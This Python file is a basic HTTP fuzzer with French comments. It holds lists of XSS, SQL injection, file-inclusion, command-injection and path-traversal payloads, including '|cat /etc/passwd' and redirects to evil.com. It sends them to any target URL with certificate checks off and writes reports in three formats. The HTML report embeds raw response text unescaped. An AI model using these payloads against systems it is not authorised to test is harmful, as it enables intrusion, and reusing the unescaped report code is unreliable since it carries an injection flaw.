import requests
from urllib.parse import urljoin

PAYLOADS = {
    'xss': [
        "<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"
    ],
    'sqli': [
        "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", '" OR 1=1--', "admin'--"
    ],
    'lfi': [
        "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "/etc/passwd", "C:\\boot.ini"
    ],
    'rce': [
        "|id", ";id", "`id`", "$(id)", "|whoami"
    ],
    'cmdinj': [
        "|ls", ";ls", "&ls", "|cat /etc/passwd"
    ],
    'path_trav': [
        "../", "..\\", "../../../../windows/win.ini", "../../../../etc/passwd"
    ],
    'open_redirect': [
        "//evil.com", "http://evil.com", "//attacker.com"
    ],
    'other': [
        "<invalid>", "'\"\"\"\"", "\\\\\\\\", "<random>"
    ]
}

ALL_PAYLOADS = [p for plist in PAYLOADS.values() for p in plist]


def fuzz_url(url, method="GET", params=None, headers=None, timeout=5):
    """
    Fuzz l'URL cible avec différents payloads sur les paramètres et le chemin.
    Retourne une liste de résultats suspects (code HTTP inhabituel, reflets, erreurs).
    """
    results = []
    if params is None:
        params = {}
    if headers is None:
        headers = {}
    # Fuzzing sur les paramètres
    for param in params.keys():
        for payload in ALL_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            try:
                resp = requests.request(method, url, params=test_params if method=="GET" else None,
                                       data=test_params if method!="GET" else None,
                                       headers=headers, timeout=timeout, verify=False)
                if resp.status_code >= 500 or any(payload in resp.text for payload in PAYLOADS['xss']):
                    results.append({
                        'type': 'param',
                        'param': param,
                        'payload': payload,
                        'status': resp.status_code,
                        'length': len(resp.text),
                        'evidence': resp.text[:200]
                    })
            except Exception as e:
                results.append({'type':'error','param':param,'payload':payload,'error':str(e)})
    # Fuzzing sur le chemin
    for payload in ALL_PAYLOADS:
        fuzzed_url = urljoin(url + '/', payload)
        try:
            resp = requests.get(fuzzed_url, headers=headers, timeout=timeout, verify=False)
            if resp.status_code >= 500 or any(payload in resp.text for payload in PAYLOADS['xss']):
                results.append({
                    'type': 'path',
                    'payload': payload,
                    'status': resp.status_code,
                    'length': len(resp.text),
                    'evidence': resp.text[:200]
                })
        except Exception as e:
            results.append({'type':'error','payload':payload,'error':str(e)})
    return results


def export_fuzz_results(results, url, method, params, export_base):
    """
    Exporte les résultats de fuzzing HTTP au format JSON, Markdown et HTML.
    export_base : chemin de base sans extension
    """
    import json, datetime
    now = datetime.datetime.now().isoformat()
    meta = {
        'url': url,
        'method': method,
        'params': params,
        'date': now,
        'total_results': len(results)
    }
    import os, datetime
    date_dir = datetime.datetime.now().strftime("%Y%m%d")
    base_dir = os.path.join(os.getcwd(), "exports", date_dir, "fuzz_http")
    os.makedirs(base_dir, exist_ok=True)
    export_base = os.path.join(base_dir, os.path.basename(export_base))
    # JSON
    with open(export_base + '.json', 'w', encoding='utf-8') as f:
        json.dump({'meta': meta, 'results': results}, f, ensure_ascii=False, indent=2)
    # Markdown
    with open(export_base + '.md', 'w', encoding='utf-8') as f:
        f.write(f"# Rapport de Fuzzing HTTP\n\n")
        f.write(f"**URL** : {url}\n\n**Méthode** : {method}\n\n**Paramètres** : {params}\n\n**Date** : {now}\n\n**Total résultats** : {len(results)}\n\n")
        for i, r in enumerate(results, 1):
            f.write(f"## Résultat {i}\n")
            for k, v in r.items():
                f.write(f"- **{k}** : {v}\n")
            f.write("\n")
    # HTML
    with open(export_base + '.html', 'w', encoding='utf-8') as f:
        f.write(f"<html><head><meta charset='utf-8'><title>Rapport Fuzzing HTTP</title></head><body>")
        f.write(f"<h1>Rapport de Fuzzing HTTP</h1>")
        f.write(f"<b>URL :</b> {url}<br><b>Méthode :</b> {method}<br><b>Paramètres :</b> {params}<br><b>Date :</b> {now}<br><b>Total résultats :</b> {len(results)}<br><hr>")
        for i, r in enumerate(results, 1):
            f.write(f"<h2>Résultat {i}</h2><ul>")
            for k, v in r.items():
                f.write(f"<li><b>{k}</b> : {v}</li>")
            f.write("</ul><br>")
        f.write("</body></html>")
